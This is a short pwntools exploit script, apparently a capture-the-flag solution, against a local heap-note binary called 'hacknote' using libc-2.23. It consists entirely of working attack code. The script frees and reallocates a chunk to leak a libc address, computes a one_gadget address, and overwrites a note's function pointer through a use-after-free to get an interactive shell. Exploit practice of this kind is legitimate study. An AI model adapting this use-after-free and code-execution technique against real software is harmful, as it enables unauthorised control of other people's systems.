#!/usr/bin/python
#coding=utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','sh','-c']
context.binary = './hacknote'
p = process('./hacknote')
libc = './libc-2.23.so'
p.sendlineafter("what's your name!\n",'aaa')
def add(size,payload):
	p.sendlineafter("Your choice :",'1')
	p.sendlineafter("Note size :",str(size))
	p.sendlineafter("Content :",payload)
def delete(idx):
	p.sendlineafter('Your choice :','2')
	p.sendlineafter("Index :",str(idx))
def show(idx):
	p.sendlineafter("Your choice :",'3')
	p.sendlineafter("Index :",str(idx))
add(0x80,'222')
add(0x10,'333')
delete(0)
add(0x80,'a'*7)
show(2)
p.recvuntil('a'*7+'\n')
libc_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))-3951480
one = libc_base+0x45216
info(hex(libc_base))
# gdb.attach(p)
delete(2)
delete(1)
add(0x40,'aaa')
add(0x10,p64(one))
# gdb.attach(p)
show(2)
p.interactive()